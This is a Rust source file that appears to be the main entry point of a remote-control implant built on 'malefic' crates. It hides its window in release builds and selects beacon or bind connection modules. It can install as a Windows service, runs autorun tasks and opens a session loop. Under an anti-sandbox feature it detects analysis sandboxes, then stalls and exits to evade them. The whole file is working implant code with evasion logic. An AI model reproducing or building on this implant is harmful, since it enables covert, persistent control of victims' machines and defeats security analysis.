#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;
mod bootstrap;
mod session_loop;
#[cfg(all(target_os = "windows", feature = "windows_service"))]
mod windows_service;

use futures::executor::block_on;

fn main() {
    #[cfg(all(target_os = "windows", feature = "windows_service"))]
    {
        if windows_service::run_service_or_fallback(run_runtime) {
            return;
        }
    }
    run_runtime();
}

fn run_runtime() {
    block_on(async {
        #[cfg(all(feature = "anti_sandbox", target_os = "windows"))]
        {
            use malefic_evader::sandbox::{detect_sandbox, perform_computational_task};
            use std::process::exit;
            let sandbox_result = detect_sandbox();
            if sandbox_result.is_sandbox {
                perform_computational_task(4294836225);
                exit(0);
            }
        }

        #[cfg(feature = "malefic-autorun")]
        if let Err(_e) = malefic_autorun::run() {
            malefic_common::debug!("Failed to execute autorun: {}", _e);
        }

        bootstrap::run(malefic_proto::get_sid()).await;
    });
}
